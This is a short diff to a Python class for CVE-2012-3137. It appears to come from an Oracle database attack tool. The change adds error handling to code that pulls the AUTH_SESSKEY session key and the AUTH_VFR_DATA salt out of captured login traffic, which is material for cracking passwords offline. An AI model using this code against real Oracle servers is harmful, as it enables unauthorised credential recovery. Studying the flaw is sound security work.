@@ -86,9 +86,16 @@ class CVE_2012_3137 ():
 					if "AUTH_SESSKEY" in raw and "AUTH_VFR_DATA" in raw:	
 						sessionKey = re.findall(r"[0-9a-fA-F]{96}" ,raw[raw.index("AUTH_SESSKEY"):raw.index("AUTH_VFR_DATA")])
 						if sessionKey != [] : sessionKey = sessionKey[0]
-						salt = re.findall(r"[0-9a-fA-F]{22}" ,raw[raw.index("AUTH_VFR_DATA"):raw.index("AUTH_GLOBALLY_UNIQUE_DBID")])
-						if salt != [] : salt = salt[0][2:]			
-						return True
+						try : authVFRindex = raw.index("AUTH_VFR_DATA")
+						except : logging.warning("The following string doesn't contain AUTH_VFR_DATA: {0}".format(raw))
+						else:
+							try: authGloIndex = raw.index("AUTH_GLOBALLY_UNIQUE_DBID")
+							except : logging.warning("The following string doesn't contain AUTH_GLOBALLY_UNIQUE_DBID: {0}".format(raw))
+							else:
+								salt = re.findall(r"[0-9a-fA-F]{22}" ,raw[authVFRindex:authGloIndex])
+								if salt != [] : salt = salt[0][2:]
+						finally:
+							return True
 			return False
 		self.__resetSessionKeyValueAndSalt__()
 		#print "Run with tcp and host {0} and port {1}".format(ip,port)
